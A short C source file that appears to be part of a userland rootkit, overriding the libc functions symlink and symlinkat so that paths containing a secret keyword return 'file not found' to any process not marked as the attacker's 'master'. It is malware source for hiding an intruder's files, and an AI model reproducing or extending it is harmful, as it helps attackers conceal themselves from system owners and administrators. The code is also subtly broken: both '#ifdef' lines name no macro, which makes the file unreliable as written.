/*
*
*@@@ landyy @@@
*
*
*/

#include "h00kDir.h"

int (*old_symlink)(const char *path1, const char *path2);
int (*old_symlinkat)(const char *target, int newdirfd, const char *linkpath);

int symlink(const char *path1, const char *path2){

    #ifdef
	printf("symlink hooked\n");
    #endif
    
    if(ismaster() == 0){
	if(strstr(path1, keyword) || strstr(path2, keyword)){
	    errno = ENOENT;
	    return -1;
	}
    }

    return old_symlink(path1, path2);

}

int symlinkat(const char *target, int newdirfd, const char *linkpath){
    
    #ifdef
	printf("symlinkat hooked\n");
    #endif

    return old_symlinkat(target, newdirfd, linkpath);
}


